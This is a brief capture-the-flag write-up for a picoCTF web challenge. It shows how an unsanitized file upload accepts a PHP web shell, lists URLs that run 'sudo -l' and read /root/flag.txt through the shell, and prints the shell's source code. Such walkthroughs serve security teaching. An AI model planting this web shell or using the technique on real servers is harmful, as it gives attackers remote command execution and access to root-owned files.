## n0s4nn1ty 1
There are somethings that need to be remembered:
1. A php shell is a script written in PHP that lets a user execute system-level commands on a server through a web browser - like a remote terminal via a web page.
2. Since the upload is not sanitized, you can upload the php file.
3. Go to the path http://standard-pizzas.picoctf.net:59410/uploads/shell.php and execute command below to get the info of the current user and then explore the hidden flag file.

http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo -l
http://standard-pizzas.picoctf.net:63914/uploads/shell.php?cmd=sudo cat /root/flag.txt


example: 
<?php
if(isset($_GET['cmd'])){
    echo "<pre>";
    $cmd = $_GET['cmd'];  // Get command from the query string
    system($cmd);         // Execute the command and display output
    echo "</pre>";
}
?>